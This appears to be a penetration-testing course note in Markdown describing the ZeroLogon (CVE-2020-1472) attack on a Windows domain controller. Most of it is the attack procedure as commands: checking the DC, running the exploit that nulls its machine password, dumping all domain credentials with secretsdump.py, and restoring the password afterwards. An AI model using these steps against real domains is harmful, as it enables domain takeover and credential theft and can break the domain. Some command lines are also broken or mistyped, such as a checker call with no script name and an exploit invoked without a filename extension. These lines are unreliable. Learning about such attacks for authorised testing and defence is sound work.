---
tags:
  - PEH
---
## Definition
ZeroLogon is a **==VERY DANGEROUS attack== which can destroy the whole domain**, and the reason behind this because it sets the authentication of the DC to null. If the attack is not executed (AND RETRIEVED) properly, the DC (and the whole domain consecutively) will be destroyed.
## Executing ZeroLogon
1. Check if the DC is vulnerable to ZeroLogon
```bash
# Run the checker against the DC
python3 <dc-pc-name> <dc-ip>
```
2. Run the CVE
```bash
python3 cve-2020-1472 <dc-pc-name> <dc-ip>
```
3. Execute the attack
```bash
secretsdump.py -just-dc <domain-name>/<dc-pc-name>\$@<dc-ip>
```
4. Restoring the DC password (MOST IMPORTANT PART!)
	1. run `python3 secretsdump.py administartor@<dc-ip> -hashes <admin-hash>`
	2. Copy the `plain_password_hex`
	3. Run the `restorepassword.py` script: `python3 restorepassword.py <domain-name>/<dc-pc-name>@<dc-pc-name> -target-ip <dc-ip> -hexpass <plain_password_hex>`